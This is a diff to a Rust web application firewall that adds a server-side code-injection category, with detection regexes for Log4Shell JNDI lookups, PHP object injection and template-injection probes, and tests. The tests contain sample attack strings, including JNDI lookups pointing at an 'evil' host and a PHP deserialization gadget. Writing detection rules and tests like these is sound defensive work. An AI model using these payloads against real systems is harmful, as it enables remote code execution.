@@ -6,8 +6,9 @@
 //! (path + query), and header values. `RegexSet` matches every pattern in a single
 //! pass and uses `aho-corasick` internally for literal prefiltering, so adding more
 //! signatures stays cheap. The starter ruleset covers the classic signature classes
-//! (SQLi / XSS / path traversal & file-inclusion wrappers / OS command injection /
-//! protocol anomalies); it is **not** OWASP-CRS-complete — the 100%-Rust rule (no
+//! (SQLi / XSS / path traversal & file-inclusion wrappers / OS command injection / SSRF /
+//! server-side code & expression injection / protocol anomalies); it is **not**
+//! OWASP-CRS-complete — the 100%-Rust rule (no
 //! Coraza/ModSecurity FFI) means CRS coverage is reached by porting rules into this
 //! engine, never by linking a foreign one. Rules are operator-extensible: [`Waf::new`]
 //! takes any rule iterator, so a caller can extend [`starter_rules`] with its own — and
@@ -59,13 +60,18 @@ pub enum WafCategory {
 	/// internal/loopback/metadata URL. IP-free to detect (the *URL value* is in the
 	/// request), so it survives the loss of client IP and ports directly over Tor.
 	Ssrf,
+	/// Server-side code / expression injection: payloads that drive the server to evaluate
+	/// attacker-controlled code — Log4Shell-style `${jndi:…}` JNDI lookups, server-side
+	/// template-injection probes, and serialized-object (deserialization) gadgets. Pure
+	/// request-value inspection, so it ports over Tor unchanged.
+	CodeInjection,
 	/// Malformed or anomalous protocol input (control chars, header injection).
 	ProtocolAnomaly,
 }
 
 impl WafCategory {
 	/// Every category, in [`index`](Self::index) order — for iterating per-category metrics.
-	pub const ALL: [WafCategory; 6] = [Self::Sqli, Self::Xss, Self::PathTraversal, Self::CommandInjection, Self::Ssrf, Self::ProtocolAnomaly];
+	pub const ALL: [WafCategory; 7] = [Self::Sqli, Self::Xss, Self::PathTraversal, Self::CommandInjection, Self::Ssrf, Self::CodeInjection, Self::ProtocolAnomaly];
 
 	/// A stable, lowercase name for logs and security events.
 	#[must_use]
@@ -76,6 +82,7 @@ impl WafCategory {
 			Self::PathTraversal => "path_traversal",
 			Self::CommandInjection => "command_injection",
 			Self::Ssrf => "ssrf",
+			Self::CodeInjection => "code_injection",
 			Self::ProtocolAnomaly => "protocol_anomaly",
 		}
 	}
@@ -89,7 +96,7 @@ impl WafCategory {
 	#[must_use]
 	pub const fn weight(self) -> u32 {
 		match self {
-			Self::Sqli | Self::CommandInjection | Self::Ssrf | Self::PathTraversal => 5,
+			Self::Sqli | Self::CommandInjection | Self::Ssrf | Self::PathTraversal | Self::CodeInjection => 5,
 			Self::Xss => 4,
 			Self::ProtocolAnomaly => 3,
 		}
@@ -105,7 +112,8 @@ impl WafCategory {
 			Self::PathTraversal => 2,
 			Self::CommandInjection => 3,
 			Self::Ssrf => 4,
-			Self::ProtocolAnomaly => 5,
+			Self::CodeInjection => 5,
+			Self::ProtocolAnomaly => 6,
 		}
 	}
 }
@@ -572,6 +580,11 @@ pub fn starter_rules() -> Vec<Rule> {
 		Rule { id: "ssrf_cloud_metadata_path", category: WafCategory::Ssrf, pattern: r"(?i)/(latest/meta-data|computeMetadata/v1|metadata/instance)\b" },
 		Rule { id: "ssrf_internal_scheme", category: WafCategory::Ssrf, pattern: r"(?i)\b(gopher|dict|file)://" },
 		Rule { id: "ssrf_loopback_url", category: WafCategory::Ssrf, pattern: r"(?i)\b(https?|ftp)://(localhost|127\.0\.0\.1|0\.0\.0\.0|\[::1\])" },
+		// --- Server-side code / expression injection (value inspection; no client IP needed) ---
+		Rule { id: "code_log4shell_jndi", category: WafCategory::CodeInjection, pattern: r"(?i)\$\{jndi:" },
+		Rule { id: "code_log4j_nested_lookup", category: WafCategory::CodeInjection, pattern: r"(?i)\$\{[^}]{0,30}\$\{" },
+		Rule { id: "code_php_object_inject", category: WafCategory::CodeInjection, pattern: r#"(?i)\b[oc]:\d+:"[a-z0-9_\\]+":\d+:\{"# },
+		Rule { id: "code_ssti_arithmetic", category: WafCategory::CodeInjection, pattern: r"\$\{\s*\d+\s*[*]\s*\d+\s*\}" },
 		// --- Protocol anomalies ---
 		Rule { id: "anomaly_null_byte", category: WafCategory::ProtocolAnomaly, pattern: r"(\x00|%00)" },
 		Rule { id: "anomaly_crlf", category: WafCategory::ProtocolAnomaly, pattern: r"(\r\n|%0d%0a|%0a|%0d)" },
@@ -1008,9 +1021,29 @@ mod tests {
 	fn ssrf_category_metadata_is_stable() {
 		assert_eq!(WafCategory::Ssrf.name(), "ssrf");
 		assert_eq!(WafCategory::ALL[WafCategory::Ssrf.index()], WafCategory::Ssrf);
-		// The index is still a bijection over the (now six) categories.
+		// The index is still a bijection over the (now seven) categories.
 		for cat in WafCategory::ALL {
 			assert_eq!(WafCategory::ALL[cat.index()], cat);
+		}
+	}
+
+	#[test]
+	fn code_injection_rules_match() {
+		let waf = Waf::starter();
+		// Log4Shell and its nested-lookup obfuscation, a PHP unserialize gadget, and the
+		// classic ${7*7} SSTI probe all attribute to the CodeInjection class.
+		assert_eq!(waf.inspect_str("x=${jndi:ldap://evil/a}", "query").map(|m| m.category), Some(WafCategory::CodeInjection));
+		assert_eq!(waf.inspect_str("x=${${lower:j}ndi:rmi://evil}", "query").unwrap().rule_id, "code_log4j_nested_lookup");
+		assert_eq!(waf.inspect_str(r#"data=O:8:"Exploit":1:{s:3:"cmd"}"#, "query").unwrap().rule_id, "code_php_object_inject");
+		assert_eq!(waf.inspect_str("tpl=${7*7}", "query").unwrap().rule_id, "code_ssti_arithmetic");
+	}
+
+	#[test]
+	fn code_injection_rules_keep_false_positives_low() {
+		// Benign requests mentioning braces/dollars or the word "code" must still pass.
+		let waf = Waf::starter();
+		for uri in ["/articles/json-${schema}-guide", "/pricing?total=7", "/docs/php-serialization-explained", "/blog/clean-code-tips"] {
+			assert_eq!(waf.inspect(&parts("GET", uri)), Verdict::Allow, "{uri} should not false-positive");
 		}
 	}
 
